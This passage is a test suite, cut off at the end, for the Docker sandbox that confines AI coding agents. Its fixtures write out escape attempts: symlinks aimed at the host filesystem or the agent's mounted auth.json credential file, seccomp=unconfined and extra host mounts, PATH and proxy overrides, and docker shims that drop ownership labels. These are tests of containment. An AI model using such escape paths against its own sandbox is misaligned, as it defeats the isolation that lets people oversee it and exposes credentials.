import { execFileSync, spawnSync } from 'node:child_process';
import { createHash, randomBytes, randomUUID } from 'node:crypto';
import { chmodSync, existsSync, mkdtempSync, mkdirSync, readFileSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { captureInvocation, type InvocationInput, type Phase } from '../agents/contract.ts';
import { AGENT_IMAGE, assertBuiltAgentImage, buildAgentImage } from '../agents/container/image.ts';
import { assertContainerProfile, createContainerProfile, disposeContainerProfile,
  isContainerProfileAuthentic } from '../agents/container/profile.ts';
import { createValidatedContainer, disposeValidatedContainer, prepareTaskFilesystems, removeTaskFilesystems, runContainer,
  startValidatedContainer, hasExactOptions, validateContainer } from '../agents/container/run.ts';
import { createTaskClone } from '../git/clone.ts';
import { hasOwnerLabels } from '../agents/labels.ts';
import { exportTaskDiff, isRecoveredTaskStorage, prepareTaskFilesystemsAsync, taskFilesystemOwner, EXPORT_SCRIPT } from '../agents/container/storage.ts';
import { inspectTaskChanges, manifestDigest, MAXIMUM_CHANGES, MAXIMUM_NAME_BYTES, snapshotDeclaredLinks } from '../agents/container/changes.ts';
import { recoverLeftovers } from '../agents/recovery.ts';
import { createVendorNetwork, removeVendorNetwork, VendorNetworkCreationCleanupError,
  type VendorNetwork } from '../agents/network/network.ts';
import { createClaudeCommand, createCodexCommand, createIsolationProbeCommand, createPhasePolicy,
  assertPhasePolicy, type AgentCommand, type IsolationProbe } from '../agents/policy.ts';
const TEST_RUNNER_OWNER = '0123456789abcdef0123456789abcdef';
const testOwner = (attemptId = 'fixture') => ({ runnerOwner: TEST_RUNNER_OWNER, attemptId, allocationId: randomUUID() });

const roots: string[] = [];
const taskFilesystems: ReturnType<typeof prepareTaskFilesystems>[] = [];
const containers = new Set<string>();
const profiles: Awaited<ReturnType<typeof createContainerProfile>>[] = [];
let imageId = '';
const vendorNetworks: VendorNetwork[] = [];
const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-c', 'core.hooksPath=/dev/null', ...args],
  { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const docker = (...args: string[]) => execFileSync('docker', args, {
  encoding: 'utf8', timeout: 60_000, stdio: ['ignore', 'pipe', 'pipe'],
}).trim();

function fixture(options: { limits?: Parameters<typeof prepareTaskFilesystems>[1]; historyBytes?: number;
  hostile?: (source: string, root: string) => void } = {}) {
  const root = mkdtempSync(join(tmpdir(), 'agent-container-')); roots.push(root);
  const source = join(root, 'source'), staging = join(root, 'staging'), input = join(root, 'input');
  mkdirSync(source); mkdirSync(staging); mkdirSync(input);
  git(source, 'init'); git(source, 'config', 'user.name', 'Test'); git(source, 'config', 'user.email', 'test@example.com');
  if (options.historyBytes) {
    // Incompressible history that no longer exists in the checked-out worktree.
    writeFileSync(join(source, 'history.bin'), randomBytes(options.historyBytes));
    git(source, 'add', '.'); git(source, 'commit', '-m', 'history');
    rmSync(join(source, 'history.bin'));
  }
  options.hostile?.(source, root);
  writeFileSync(join(source, 'file.txt'), 'trusted\n'); git(source, 'add', '-A'); git(source, 'commit', '-m', 'baseline');
  writeFileSync(join(input, 'schema.json'), '{"probe":"codeboost-schema-marker"}\n');
  chmodSync(join(input, 'schema.json'), 0o444); chmodSync(input, 0o555);
  const clone = createTaskClone({ source, parent: staging, taskId: 'task-1', head: git(source, 'rev-parse', 'HEAD') });
  const filesystems = prepareTaskFilesystems(clone, options.limits ?? {
    workBytes: 16 * 1024 * 1024, workInodes: 512, metadataBytes: 16 * 1024 * 1024, metadataInodes: 512,
  }, imageId, testOwner());
  taskFilesystems.push(filesystems);
  const fakeAuth = join(root, 'auth.json'); writeFileSync(fakeAuth, '{}', { mode: 0o600 });
  return { root, source, input, clone, filesystems, fakeAuth };
}

function invocation(clone: ReturnType<typeof createTaskClone>, phase: Phase, vendor: 'codex' | 'claude' = 'codex',
  deadlineMs = 60_000): InvocationInput {
  return captureInvocation({ runnerOwner: TEST_RUNNER_OWNER, clone, phase, vendor, approvedArgv: phase === 'planning' || phase === 'questions' ? [] : [['git', 'status']],
    deadline: Date.now() + deadlineMs, attemptId: `${vendor}-${phase}-${Math.random().toString(16).slice(2)}`,
    context: { snapshotId: 'snapshot-1', planId: 'plan-1', planRevision: 1, assignmentId: 'assignment-1',
      referencedCodeHash: 'code-1', stateVersion: 1 } });
}
const governed = async (captured: InvocationInput, probe: IsolationProbe = 'noop') => {
  const policy = createPhasePolicy(captured), network = await createVendorNetwork(captured, imageId, randomUUID());
  vendorNetworks.push(network);
  return { invocation: captured, policy, network, command: createIsolationProbeCommand(policy, probe) };
};

async function profile(data: ReturnType<typeof fixture>, phase: Phase,
  command: IsolationProbe | ((policy: ReturnType<typeof createPhasePolicy>) => AgentCommand), options: {
  vendor?: 'codex' | 'claude'; authProbe?: boolean; codexAuthFile?: string; claudeToken?: string; deadlineMs?: number;
} = {}) {
  const vendor = options.vendor ?? 'codex';
  const captured = invocation(data.clone, phase, vendor, options.deadlineMs);
  const policy = createPhasePolicy(captured), network = await createVendorNetwork(captured, imageId, randomUUID());
  vendorNetworks.push(network);
  const trustedCommand = typeof command === 'string' ? createIsolationProbeCommand(policy, command) : command(policy);
  const base = await createContainerProfile({ invocation: captured, policy, network, filesystems: data.filesystems,
    inputDirectory: data.input, command: trustedCommand, imageId,
    codexAuthFile: vendor === 'codex' ? (options.codexAuthFile ?? data.fakeAuth) : undefined,
    claudeToken: vendor === 'claude' ? options.claudeToken : undefined });
  profiles.push(base);
  return base;
}

beforeAll(async () => {
  imageId = buildAgentImage();
}, 10 * 60_000);
afterEach(async () => {
  for (const network of vendorNetworks.splice(0).reverse()) await removeVendorNetwork(network);
}, 120_000);
afterAll(async () => {
  for (const container of containers) spawnSync('docker', ['rm', '--force', container], { stdio: 'ignore' });
  for (const filesystems of taskFilesystems.reverse()) removeTaskFilesystems(filesystems);
  for (const profile of profiles) await disposeContainerProfile(profile);
  for (const network of vendorNetworks.splice(0).reverse()) await removeVendorNetwork(network);
  for (const root of roots.reverse()) {
    chmodSync(join(root, 'input'), 0o700);
    rmSync(root, { recursive: true, force: true, maxRetries: 3, retryDelay: 50 });
  }
}, 120_000);

describe('real Docker agent isolation', () => {
  it.each(['planning', 'questions', 'review', 'execute', 'fix'] as const)(
    '%s applies its enforced worktree access profile', async phase => {
      const data = fixture();
      expect(await runContainer(await profile(data, phase, 'phase-worktree'))).toBe('');
    }, 60_000);

  it('removes the invocation proxy and network after the container settles', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    expect(await runContainer(valid)).toBe('');
    expect(spawnSync('docker', ['container', 'inspect', valid.network.proxyContainer]).status).not.toBe(0);
    expect(spawnSync('docker', ['network', 'inspect', valid.network.name]).status).not.toBe(0);
  }, 60_000);

  it('runs read-only with no root capabilities, host paths, inherited secrets, or writable tools', async () => {
    const data = fixture();
    process.env.HOST_SECRET_SENTINEL = 'must-not-reach-container';
    try {
      const output = await runContainer(await profile(data, 'planning', 'read-only-isolation'));
      expect(output).toBe('isolated');
    } finally { delete process.env.HOST_SECRET_SENTINEL; }
  }, 60_000);

  it('seeds Git history larger than the work allocation into the metadata volume only', async () => {
    const data = fixture({ historyBytes: 4 * 1024 * 1024, limits: {
      workBytes: 1024 * 1024, workInodes: 512, metadataBytes: 16 * 1024 * 1024, metadataInodes: 512,
    } });
    expect(await runContainer(await profile(data, 'execute', 'metadata'))).toBe('metadata-safe');
  }, 60_000);

  it('accepts byte limits that tmpfs rounds up to a whole page', async () => {
    const data = fixture({ limits: {
      workBytes: 16 * 1024 * 1024 + 1, workInodes: 512, metadataBytes: 16 * 1024 * 1024 + 1, metadataInodes: 512,
    } });
    expect(await runContainer(await profile(data, 'execute', 'noop'))).toBe('');
  }, 60_000);

  it('requests private IPC and cgroup namespaces instead of relying on daemon defaults', async () => {
    const args = (await profile(fixture(), 'planning', 'noop')).args;
    expect(args).toContain('--ipc=private');
    expect(args).toContain('--cgroupns=private');
  }, 60_000);

  it.each(['planning', 'review', 'execute'] as const)(
    'keeps Git metadata unchanged under link, alias, truncation and replacement attempts during %s', async phase => {
      expect(await runContainer(await profile(fixture(), phase, 'metadata-alias'))).toBe('metadata-unchanged');
    }, 60_000);

  it('enforces byte and inode ceilings on every Codex scratch area', async () => {
    expect(await runContainer(await profile(fixture(), 'execute', 'scratch-capacity'))).toBe('scratch-bounded');
  }, 120_000);

  it('enforces byte and inode ceilings on every Claude scratch area', async () => {
    const placeholder = 'offline-placeholder-token';
    const claude = await profile(fixture(), 'execute', 'scratch-capacity', { vendor: 'claude', claudeToken: placeholder });
    expect(await runContainer(claude, 60_000, { CLAUDE_CODE_OAUTH_TOKEN: placeholder })).toBe('scratch-bounded');
  }, 120_000);

  it.each([
    ['an absolute link to a host file', (source: string, root: string) => {
      writeFileSync(join(root, 'host-only.txt'), 'codeboost-host-secret\n');
      symlinkSync(join(root, 'host-only.txt'), join(source, 'escape'));
    }],
    ['an absolute link to the filesystem root', (source: string) => symlinkSync('/', join(source, 'root-link'))],
    ['a relative link that climbs out of the checkout', (source: string) => {
      mkdirSync(join(source, 'nested')); symlinkSync('../../..', join(source, 'nested', 'up'));
    }],
    ['a chain of in-checkout links that ends outside it', (source: string) => {
      mkdirSync(join(source, 'deep')); mkdirSync(join(source, 'deep', 'er'));
      symlinkSync('../..', join(source, 'deep', 'er', 'top'));
      symlinkSync('deep/er/top/..', join(source, 'chained'));
    }],
    ['a chain that leaves through a target this host lacks', (source: string) => {
      // On the host the final path is missing, but in the container /work/.. is / and the credential mount exists.
      mkdirSync(join(source, 'deep')); mkdirSync(join(source, 'deep', 'er'));
      symlinkSync('../..', join(source, 'deep', 'er', 'top'));
      symlinkSync('deep/er/top/../run/codeboost-auth/codex/auth.json', join(source, 'chained'));
    }],
  ] as const)('refuses to seed a repository with %s, before any storage exists', async (_label, hostile) => {
    const owned = () => [docker('volume', 'ls', '--quiet', '--filter', 'label=io.codeboost.allocation'),
      docker('ps', '--all', '--quiet', '--filter', 'label=io.codeboost.allocation')].join('\n').split('\n').filter(Boolean);
    const before = new Set(owned());
    expect(() => fixture({ hostile })).toThrow('leaves the checkout');
    expect(owned().filter(id => !before.has(id))).toEqual([]);
  }, 60_000);

  it('refuses to seed a clone whose Git metadata contains a link, before any storage exists', async () => {
    const data = fixture();
    const clone = createTaskClone({ source: data.source, parent: join(data.root, 'staging'), taskId: 'task-git-link',
      head: git(data.source, 'rev-parse', 'HEAD') });
    // /work/.git is mounted read-only, which stops writes but not reads through a link.
    symlinkSync('/run/codeboost-auth/codex/auth.json', join(clone.directory, '.git', 'credential'));
    const owned = () => [docker('volume', 'ls', '--quiet', '--filter', 'label=io.codeboost.allocation'),
      docker('ps', '--all', '--quiet', '--filter', 'label=io.codeboost.allocation')].join('\n').split('\n').filter(Boolean);
    const before = new Set(owned());
    expect(() => prepareTaskFilesystems(clone, {
      workBytes: 16 * 1024 * 1024, workInodes: 512, metadataBytes: 16 * 1024 * 1024, metadataInodes: 512,
    }, imageId, testOwner())).toThrow('Git metadata contains a link');
    expect(owned().filter(id => !before.has(id))).toEqual([]);
  }, 60_000);

  it('seeds links that stay inside the checkout, including loops and not-yet-existing targets', async () => {
    const data = fixture({ hostile: source => {
      mkdirSync(join(source, 'docs'));
      writeFileSync(join(source, 'docs', 'guide.md'), 'guide\n');
      symlinkSync('docs/guide.md', join(source, 'readme-link'));
      symlinkSync('../docs', join(source, 'docs', 'self'));
      symlinkSync('.', join(source, 'loop'));
      symlinkSync('cycle-b', join(source, 'cycle-a'));
      symlinkSync('cycle-a', join(source, 'cycle-b'));
      symlinkSync('later.txt', join(source, 'future'));
    } });
    const started = performance.now();
    expect(await runContainer(await profile(data, 'planning', 'hostile-repo'))).toBe('hostile-repo-contained');
    expect(performance.now() - started).toBeLessThan(30_000);
  }, 60_000);

  it('fails closed without leaving storage when a repository exceeds its allocation', async () => {
    const owned = () => [docker('volume', 'ls', '--quiet', '--filter', 'label=io.codeboost.allocation'),
      docker('ps', '--all', '--quiet', '--filter', 'label=io.codeboost.allocation')].join('\n').split('\n').filter(Boolean);
    const before = new Set(owned());
    expect(() => fixture({ historyBytes: 4 * 1024 * 1024, limits: {
      workBytes: 16 * 1024 * 1024, workInodes: 512, metadataBytes: 1024 * 1024, metadataInodes: 512,
    } })).toThrow();
    expect(owned().filter(id => !before.has(id))).toEqual([]);
  }, 60_000);

  it('persists execution changes while replacing HOME and scratch for each invocation', async () => {
    const data = fixture();
    expect(await runContainer(await profile(data, 'execute', 'persist-write'))).toBe('first');
    const output = await runContainer(await profile(data, 'execute', 'persist-read'));
    expect(output).toContain('?? generated.txt');
  }, 60_000);

  it('enforces work byte and inode ceilings before writes can exceed the allocation', async () => {
    const data = fixture();
    const output = await runContainer(await profile(data, 'execute', 'capacity'));
    expect(output).toBe('bounded');
  }, 60_000);

  it('keeps Git metadata read-only, on another filesystem, and mounted against replacement', async () => {
    const data = fixture();
    const output = await runContainer(await profile(data, 'execute', 'metadata'));
    expect(output).toBe('metadata-safe');
  }, 60_000);

  it('refuses a container missing read-only root before its command runs', async () => {
    const data = fixture();
    const valid = await profile(data, 'planning', 'must-not-run');
    const args = valid.args.filter(value => value !== '--read-only');
    docker(...args);
    containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    const result = spawnSync('docker', ['start', '--attach', valid.name], { encoding: 'utf8', timeout: 30_000 });
    expect(result.status).not.toBe(0);
    containers.delete(valid.name); docker('rm', '--force', valid.name);
  }, 60_000);

  it('rejects mixed credentials and unsupported command/profile inputs', async () => {
    const data = fixture();
    await expect(createContainerProfile({ ...await governed(invocation(data.clone, 'planning', 'codex')),
      filesystems: data.filesystems, inputDirectory: data.input, codexAuthFile: data.fakeAuth,
      claudeToken: 'must-not-combine', imageId })).rejects.toThrow('only');
    await expect(createContainerProfile({ ...await governed(invocation(data.clone, 'planning', 'claude')),
      filesystems: data.filesystems, inputDirectory: data.input, imageId })).rejects.toThrow('OAuth');
    const claudeProfile = await createContainerProfile({ ...await governed(invocation(data.clone, 'planning', 'claude')),
      filesystems: data.filesystems, inputDirectory: data.input, imageId, claudeToken: 'serialization-sentinel' });
    expect(JSON.stringify(claudeProfile)).not.toContain('serialization-sentinel');
    await expect(createValidatedContainer(claudeProfile)).rejects.toThrow('OAuth environment credential');
    const untrusted = await governed(invocation(data.clone, 'planning'));
    await expect(createContainerProfile({ ...untrusted, command: { argv: ['true'] }, filesystems: data.filesystems,
      inputDirectory: data.input, codexAuthFile: data.fakeAuth, imageId })).rejects.toThrow('not generated');
    await expect(createContainerProfile({ ...await governed(invocation(data.clone, 'planning')),
      filesystems: data.filesystems, inputDirectory: data.input, codexAuthFile: data.fakeAuth,
      imageId: AGENT_IMAGE })).rejects.toThrow('immutable built image ID');
    chmodSync(data.input, 0o755); writeFileSync(join(data.input, 'extra.json'), '{}'); chmodSync(data.input, 0o555);
    await expect(profile(data, 'planning', 'noop')).rejects.toThrow('only one bounded');
  }, 60_000);

  it('rejects unexpected host mounts and unbounded task volumes after Docker resolves them', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    const imageIndex = valid.args.indexOf(imageId);
    const extraMountArgs = [...valid.args.slice(0, imageIndex), '--mount',
      'type=bind,source=/tmp,target=/unexpected,readonly', ...valid.args.slice(imageIndex)];
    docker(...extraMountArgs); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('unexpected external mount');
    docker('rm', '--force', valid.name); containers.delete(valid.name);

    const rogue = `codeboost-work-${randomUUID()}`; docker('volume', 'create', rogue);
    try {
      const rogueArgs = valid.args.map(value => value.replace(data.filesystems.workVolume, rogue));
      docker(...rogueArgs); containers.add(valid.name);
      await expect(validateContainer(valid.name, valid)).rejects.toThrow('captured identity');
      docker('rm', '--force', valid.name); containers.delete(valid.name);
    } finally { spawnSync('docker', ['volume', 'rm', '--force', rogue], { stdio: 'ignore' }); }
  }, 60_000);

  it('rejects cloned profiles while sealed snapshots ignore later host changes', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'input-marker');
    const forged = Object.freeze({ ...valid, inputDirectory: '/',
      args: Object.freeze(valid.args.map(value => value.includes(`source=${data.input},`)
        ? value.replace(`source=${data.input},`, 'source=/,') : value)) });
    await expect(createValidatedContainer(forged)).rejects.toThrow('trusted profile builder');

    await expect(createContainerProfile({ ...await governed(invocation(data.clone, 'planning')),
      filesystems: { ...data.filesystems }, inputDirectory: data.input, codexAuthFile: data.fakeAuth,
      imageId })).rejects.toThrow('trusted allocator');

    const other = fixture();
    await expect(createContainerProfile({ ...await governed(invocation(other.clone, 'planning')),
      filesystems: data.filesystems, inputDirectory: other.input, codexAuthFile: other.fakeAuth,
      imageId })).rejects.toThrow('do not belong to the invocation clone');

    writeFileSync(data.fakeAuth, '{"changed":true}');
    expect(valid.codexAuthFile).not.toBe(data.fakeAuth);
    expect(readFileSync(valid.codexAuthFile!, 'utf8')).toBe('{}');
    expect(statSync(valid.codexAuthFile!).mode & 0o777).toBe(0o444);
    writeFileSync(data.fakeAuth, '{}');

    chmodSync(data.input, 0o755); chmodSync(join(data.input, 'schema.json'), 0o644);
    writeFileSync(join(data.input, 'schema.json'), '{"probe":"changed"}\n');
    writeFileSync(join(data.input, 'extra.json'), '{}');
    chmodSync(join(data.input, 'schema.json'), 0o444); chmodSync(data.input, 0o555);
    expect(await runContainer(valid)).toBe('');
    chmodSync(data.input, 0o755); rmSync(join(data.input, 'extra.json')); chmodSync(data.input, 0o555);
  }, 60_000);

  it('rejects extra security policies and environment paths that can escape bounded storage', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    const imageIndex = valid.args.indexOf(imageId);
    const securityArgs = [...valid.args.slice(0, imageIndex), '--security-opt', 'seccomp=unconfined',
      ...valid.args.slice(imageIndex)];
    docker(...securityArgs); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    docker('rm', '--force', valid.name); containers.delete(valid.name);

    const pathArgs = [...valid.args.slice(0, imageIndex), '--env', 'PATH=/work', ...valid.args.slice(imageIndex)];
    docker(...pathArgs); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow(/environment|PATH/);
    docker('rm', '--force', valid.name); containers.delete(valid.name);

    for (const changedPath of ['npm_config_cache=/work/npm-cache', 'XDG_CACHE_HOME=/work/xdg-cache',
      'CODEX_HOME=/work', 'HTTPS_PROXY=http://example.com:3128']) {
      const changedArgs = [...valid.args.slice(0, imageIndex), '--env', changedPath, ...valid.args.slice(imageIndex)];
      docker(...changedArgs); containers.add(valid.name);
      await expect(validateContainer(valid.name, valid)).rejects.toThrow(/isolation environment|Credential profiles/);
      docker('rm', '--force', valid.name); containers.delete(valid.name);
    }
  }, 60_000);

  it('does not remove an active container when a duplicate attempt name collides', async () => {
    const data = fixture(), captured = invocation(data.clone, 'planning');
    const first = await createContainerProfile({ ...await governed(captured), filesystems: data.filesystems,
      inputDirectory: data.input, codexAuthFile: data.fakeAuth, imageId });
    const duplicate = await createContainerProfile({ ...await governed(captured), filesystems: data.filesystems,
      inputDirectory: data.input, codexAuthFile: data.fakeAuth, imageId });
    profiles.push(first, duplicate);
    docker(...first.args); containers.add(first.name);
    // The refused create made no container, so the duplicate releases its own staging without touching the name.
    await expect(createValidatedContainer(duplicate)).rejects.toThrow(/already in use|Conflict/);
    expect(existsSync(duplicate.codexAuthFile!)).toBe(false);
    expect(isContainerProfileAuthentic(duplicate)).toBe(false);
    expect(spawnSync('docker', ['network', 'inspect', duplicate.network.name], { stdio: 'ignore' }).status).not.toBe(0);
    const state = JSON.parse(docker('container', 'inspect', first.name))[0] as { State: { Status: string } };
    expect(state.State.Status).toBe('created');
    docker('rm', '--force', first.name); containers.delete(first.name);
  }, 60_000);

  it('releases a killed create once its settle window passes with no container', async () => {
    const data = fixture(), unsettled = await profile(data, 'planning', 'noop');
    const shim = join(data.root, 'docker-shim'); mkdirSync(shim);
    const realDocker = execFileSync('sh', ['-c', 'command -v docker'], { encoding: 'utf8' }).trim();
    // The create client hangs until its deadline kills it, so the daemon outcome stays unknown.
    writeFileSync(join(shim, 'docker'), ['#!/bin/sh', 'if [ "$1" = create ]; then exec sleep 30; fi',
      `exec '${realDocker}' "$@"`].join('\n'), { mode: 0o755 });
    const path = process.env.PATH;
    process.env.PATH = `${shim}:${path}`;
    const started = performance.now();
    // The create path waits out the settle window, then treats absence as settled and releases the profile.
    try { await expect(createValidatedContainer(unsettled, 3_000)).rejects.toThrow('ETIMEDOUT'); }
    finally { process.env.PATH = path; }
    expect(performance.now() - started).toBeGreaterThanOrEqual(10_000);
    expect(isContainerProfileAuthentic(unsettled)).toBe(false);
    expect(existsSync(unsettled.codexAuthFile!)).toBe(false);
  }, 60_000);

  it('keeps a killed create unsettled for later cleanup until its settle window passes', async () => {
    const data = fixture(), unsettled = await profile(data, 'planning', 'noop');
    const shim = join(data.root, 'docker-shim'); mkdirSync(shim);
    const created = join(shim, 'created'), failed = join(shim, 'failed');
    const realDocker = execFileSync('sh', ['-c', 'command -v docker'], { encoding: 'utf8' }).trim();
    // The create client hangs until killed, and the first inspect after it fails for an unrelated reason, so the
    // create path gives up early, inside the settle window.
    writeFileSync(join(shim, 'docker'), ['#!/bin/sh',
      `if [ "$1" = create ]; then touch '${created}'; exec sleep 30; fi`,
      `if [ "$1" = container ] && [ "$2" = inspect ] && [ -e '${created}' ] && [ ! -e '${failed}' ]; then`,
      `  touch '${failed}'; echo 'daemon unavailable' >&2; exit 1`, 'fi',
      `exec '${realDocker}' "$@"`].join('\n'), { mode: 0o755 });
    const path = process.env.PATH;
    process.env.PATH = `${shim}:${path}`;
    try {
      await expect(createValidatedContainer(unsettled, 3_000)).rejects.toThrow('cleanup did not settle');
      // A follow-up cleanup inside the window must not treat absence as proof and release the profile.
      await expect(disposeValidatedContainer(unsettled)).rejects.toThrow('did not settle');
    } finally { process.env.PATH = path; }
    expect(isContainerProfileAuthentic(unsettled)).toBe(true);
    expect(existsSync(unsettled.codexAuthFile!)).toBe(true);
  }, 60_000);

  it('removes the agent container by its ID, never a same-named replacement', async () => {
    const data = fixture(), live = await profile(data, 'planning', 'noop');
    await createValidatedContainer(live);
    const originalId = docker('container', 'inspect', '--format', '{{.Id}}', live.name);
    const moved = `${live.name}-moved`, replacement = live.name;
    // Someone renames our container and puts a same-named, same-labelled container in its place.
    docker('rename', live.name, moved); containers.add(moved);
    docker('create', '--name', replacement, '--label', `io.codeboost.invocation=${live.ownershipId}`,
      '--entrypoint', 'true', imageId); containers.add(replacement);
    const replacementId = docker('container', 'inspect', '--format', '{{.Id}}', replacement);
    await disposeValidatedContainer(live);
    expect(spawnSync('docker', ['container', 'inspect', originalId], { stdio: 'ignore' }).status).not.toBe(0);
    expect(docker('container', 'inspect', '--format', '{{.Id}}', replacement)).toBe(replacementId);
    expect(isContainerProfileAuthentic(live)).toBe(false);
  }, 60_000);

  it('never looks the name up again when only the profile cleanup is retried', async () => {
    const data = fixture(), live = await profile(data, 'planning', 'noop');
    await createValidatedContainer(live);
    const blocker = `codeboost-blocker-${randomUUID()}`, replacement = live.name;
    // Our container goes, but a foreign endpoint keeps the network busy, so the profile cleanup fails and is retried.
    docker('run', '--detach', '--name', blocker, '--network', live.network.name, '--entrypoint', 'sleep', imageId, '300');
    containers.add(blocker);
    await expect(disposeValidatedContainer(live)).rejects.toThrow('did not settle');
    expect(isContainerProfileAuthentic(live)).toBe(true);
    // A same-named, same-labelled container appears before the retry.
    docker('create', '--name', replacement, '--label', `io.codeboost.invocation=${live.ownershipId}`,
      '--entrypoint', 'true', imageId); containers.add(replacement);
    const replacementId = docker('container', 'inspect', '--format', '{{.Id}}', replacement);
    docker('rm', '--force', blocker); containers.delete(blocker);
    await disposeValidatedContainer(live);
    expect(isContainerProfileAuthentic(live)).toBe(false);
    expect(docker('container', 'inspect', '--format', '{{.Id}}', replacement)).toBe(replacementId);
  }, 60_000);

  it('starts the agent container by its ID, never a same-named replacement', async () => {
    const data = fixture(), live = await profile(data, 'planning', 'finite-output');
    await createValidatedContainer(live);
    const originalId = docker('container', 'inspect', '--format', '{{.Id}}', live.name);
    const moved = `${live.name}-moved`, replacement = live.name;
    docker('rename', live.name, moved); containers.add(moved);
    docker('create', '--name', replacement, '--label', `io.codeboost.invocation=${live.ownershipId}`,
      '--entrypoint', 'true', imageId); containers.add(replacement);
    expect(await startValidatedContainer(live)).toBe('stdout-marker');
    // The replacement was never started, and cleanup removed only ours.
    expect(docker('container', 'inspect', '--format', '{{.State.StartedAt}}', replacement)).toBe('0001-01-01T00:00:00Z');
    expect(spawnSync('docker', ['container', 'inspect', originalId], { stdio: 'ignore' }).status).not.toBe(0);
  }, 60_000);

  it('labels every Docker object with its runner, attempt and allocation', async () => {
    const data = fixture(), live = await profile(data, 'planning', 'noop');
    await createValidatedContainer(live); containers.add(live.name);
    const labelsOf = (kind: 'container' | 'volume' | 'network', name: string) =>
      JSON.parse(docker(kind, 'inspect', '--format', kind === 'container' ? '{{json .Config.Labels}}' : '{{json .Labels}}',
        name)) as Record<string, string>;
    const storage = taskFilesystemOwner(data.filesystems), invocation = assertPhasePolicy(live.policy);
    expect(storage.runnerOwner).toBe(TEST_RUNNER_OWNER);
    // Task storage: both volumes and the keeper carry the caller's allocation.
    for (const [kind, name] of [['volume', data.filesystems.workVolume], ['volume', data.filesystems.metadataVolume],
      ['container', data.filesystems.keeper]] as const) expect(hasOwnerLabels(labelsOf(kind, name), storage)).toBe(true);
    // The agent container: its own attempt, and the allocation it mounts.
    expect(hasOwnerLabels(labelsOf('container', live.name), { runnerOwner: TEST_RUNNER_OWNER,
      attemptId: invocation.attemptId, allocationId: storage.allocationId })).toBe(true);
    // The network and proxy: the invocation's runner and attempt, and the network's own caller-chosen allocation.
    for (const [kind, name] of [['network', live.network.name], ['container', live.network.proxyContainer]] as const) {
      const labels = labelsOf(kind, name);
      expect(labels['io.codeboost.runner']).toBe(TEST_RUNNER_OWNER);
      expect(labels['io.codeboost.attempt']).toBe(invocation.attemptId);
      expect(labels['io.codeboost.allocation']).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
      expect(labels['io.codeboost.allocation']).toBe(labels['io.codeboost.egress']);
    }
  }, 60_000);

  // A docker wrapper that drops our runner label from commands starting with one of `prefixes`, so the object it
  // creates is genuinely mislabelled and only the owner-label checks can catch it.
  const withoutRunnerLabel = async <T>(prefixes: string[][], run: () => Promise<T> | T): Promise<T> => {
    const shim = mkdtempSync(join(tmpdir(), 'codeboost-unlabelled-docker-')); roots.push(shim);
    mkdirSync(join(shim, 'input')); // afterAll resets this path's mode
    const realDocker = execFileSync('sh', ['-c', 'command -v docker'], { encoding: 'utf8' }).trim();
    writeFileSync(join(shim, 'docker'), [`#!${process.execPath}`,
      "const { spawnSync } = require('node:child_process');",
      'const args = process.argv.slice(2);',
      `const strip = ${JSON.stringify(prefixes)}.some(prefix => prefix.every((word, i) => args[i] === word));`,
      'const out = [];',
      "for (let i = 0; i < args.length; i++) { if (strip && args[i] === '--label' && String(args[i + 1]).startsWith('io.codeboost.runner=')) { i++; continue; } out.push(args[i]); }",
      `const result = spawnSync(${JSON.stringify(realDocker)}, out, { stdio: 'inherit' });`,
      'process.exit(result.status ?? 1);'].join('\n'), { mode: 0o755 });
    const path = process.env.PATH;
    process.env.PATH = `${shim}:${path}`;
    try { return await run(); } finally { process.env.PATH = path; }
  };

  it('rejects a vendor network or proxy without its runner label, and removes them', async () => {
    const data = fixture(), egress = () => docker('network', 'ls', '--quiet', '--filter', 'label=io.codeboost.egress');
    const before = egress();
    await withoutRunnerLabel([['network', 'create']], () => expect(createVendorNetwork(invocation(data.clone, 'planning'),
      imageId, randomUUID())).rejects.toThrow('changed after allocation'));
    await withoutRunnerLabel([['create', '--name']], () => expect(createVendorNetwork(invocation(data.clone, 'planning'),
      imageId, randomUUID())).rejects.toThrow('changed after allocation'));
    expect(egress()).toBe(before);
  }, 120_000);

  // Storage has no captured IDs, so cleanup refuses an object without every owner label; the test removes its own.
  const refuseThenRemove = (filesystems: ReturnType<typeof prepareTaskFilesystems>, unlabelled: string[][]) => {
    taskFilesystems.splice(taskFilesystems.indexOf(filesystems), 1);
    expect(() => removeTaskFilesystems(filesystems)).toThrow('did not settle');
    for (const command of unlabelled) docker(...command);
    removeTaskFilesystems(filesystems);
  };

  it('rejects task volumes without their runner label before the agent starts', async () => {
    const data = await withoutRunnerLabel([['volume', 'create']], () => fixture());
    const live = await profile(data, 'planning', 'must-not-run');
    await expect(createValidatedContainer(live)).rejects.toThrow('bounded tmpfs allocation');
    refuseThenRemove(data.filesystems, [['volume', 'rm', '--force', data.filesystems.workVolume,
      data.filesystems.metadataVolume]]);
  }, 60_000);

  it('rejects a keeper without its runner label before the agent starts', async () => {
    const data = await withoutRunnerLabel([['create', '--name']], () => fixture());
    const live = await profile(data, 'planning', 'must-not-run');
    await expect(createValidatedContainer(live)).rejects.toThrow('trusted keeper');
    refuseThenRemove(data.filesystems, [['rm', '--force', data.filesystems.keeper]]);
  }, 60_000);

  it('rejects an agent container without its runner label before it starts', async () => {
    const data = fixture(), live = await profile(data, 'planning', 'must-not-run');
    await withoutRunnerLabel([['create', '--name']], () =>
      expect(createValidatedContainer(live)).rejects.toThrow('lockdown'));
    expect(spawnSync('docker', ['container', 'inspect', live.name]).status).not.toBe(0);
  }, 60_000);

  it('refuses an allocation ID that still labels Docker objects, as after a restart, before creating any storage', () => {
